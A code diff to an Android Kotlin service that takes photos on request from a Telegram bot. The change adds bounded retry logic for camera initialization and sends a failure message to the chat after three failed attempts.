@@ -111,6 +111,7 @@ class LightBotService : LifecycleService() {
     private val cameraHandler = Handler(cameraThread.looper)
     private var captureTimeoutRunnable: Runnable? = null
     private var cameraReady = false
+    private var captureInitRetry = 0
 
     // ── Front camera preview ──────────────────────────────────────────
     private var previewJob: Job? = null
@@ -189,6 +190,7 @@ class LightBotService : LifecycleService() {
             )
             imageCapture = imgCapture
             cameraReady = true
+            captureInitRetry = 0
             cameraLifecycleOwner.start()
             Log.d(TAG, "[main] ImageCapture bound — HIGH (1920×1080)")
         } catch (e: Exception) {
@@ -448,12 +450,20 @@ class LightBotService : LifecycleService() {
 
     private fun captureWithWait(source: String, chatId: String?, quality: String, onDone: (() -> Unit)? = null) {
         if (cameraProvider == null || imageCapture == null) {
-            Log.w(TAG, "Camera not ready — trigger init and wait")
-            // Re-trigger async init; the listener will call bindImageCapture() which sets imageCapture.
-            // Post a delayed retry so we don't spin tight-loop if init fails.
+            if (captureInitRetry >= 3) {
+                Log.e(TAG, "Camera init failed after 3 retries — giving up")
+                captureInitRetry = 0
+                if (chatId != null) TelegramBot.sendText(Config.botToken, chatId, "[相机初始化失败，请稍后重试]")
+                onDone?.invoke()
+                return
+            }
+            captureInitRetry++
+            Log.w(TAG, "Camera not ready (retry=$captureInitRetry) — trigger init and wait")
+            initCameraProvider()
             cameraHandler.postDelayed({ captureWithWait(source, chatId, quality, onDone) }, 1000)
             return
         }
+        captureInitRetry = 0
         // Re-fetch imageCapture fresh after any front-camera op settles (500ms grace).
         cameraHandler.postDelayed({
             captureWithImageCapture(imageCapture!!, source, chatId, quality)
